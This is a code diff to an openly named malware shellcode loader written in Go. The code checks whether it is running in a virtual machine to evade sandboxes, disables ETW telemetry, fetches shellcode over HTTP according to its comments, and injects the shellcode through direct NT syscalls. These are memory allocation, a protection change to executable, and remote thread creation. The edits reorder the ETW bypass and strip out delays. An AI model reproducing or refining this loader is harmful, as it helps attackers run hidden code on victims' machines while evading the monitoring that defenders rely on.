@@ -13,7 +13,6 @@ import (
 	"net/http"
 	"strconv"
 	"strings"
-	"syscall"
 	"time"
 	"unsafe"
 
@@ -34,10 +33,6 @@ func main() {
 	if malwareUtil.VmCheck() {
 		return
 	}
-	//get the current process handle
-	handle := windows.CurrentProcess()
-	//disable etw for the current process
-	malwareUtil.EtwHell(uintptr(handle))
 	//get the shellcode by http
 	conf := strings.Split(t, ",")
 	//initial recon
@@ -60,6 +55,10 @@ func main() {
 	shellcode, _ := hex.DecodeString(string(hexSc))
 	//inject the shellcode
 	inject(shellcode)
+	//get the current process handle
+	handle := windows.CurrentProcess()
+	//disable etw for the current process
+	malwareUtil.EtwHell(uintptr(handle))
 }
 
 func sleep(t int) {
@@ -103,12 +102,10 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		windows.PAGE_READWRITE,
 	)
 	fmt.Println("Allocated memory at", baseA)
-	sleep(10)
 	//write memory
 	//bananaphone.WriteMemory(shellcode, baseA)
 	malwareUtil.Memcpy(baseA, shellcode)
 	fmt.Println("Wrote shellcode to memory")
-	sleep(10)
 	var oldprotect uintptr
 	bananaphone.Syscall(
 		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
@@ -119,7 +116,6 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		uintptr(unsafe.Pointer(&oldprotect)),
 	)
 	fmt.Println("Changed memory protection to PAGE_EXECUTE_READ")
-	sleep(10)
 	var hhosthread uintptr
 	bananaphone.Syscall(
 		NtCreateThreadExSysid,                //NtCreateThreadEx
@@ -136,7 +132,5 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		0,                                    //lpbytesbuffer
 	)
 	fmt.Println("Created thread at", hhosthread)
-	sleep(10)
-	syscall.SyscallN(uintptr(NtWaitForSingleObject), 2, hhosthread, 0xffffffff, 0)
-	//windows.WaitForSingleObject(windows.Handle(hhosthread), 0xffffffff)
+	windows.WaitForSingleObject(windows.Handle(hhosthread), 0xffffffff)
 }
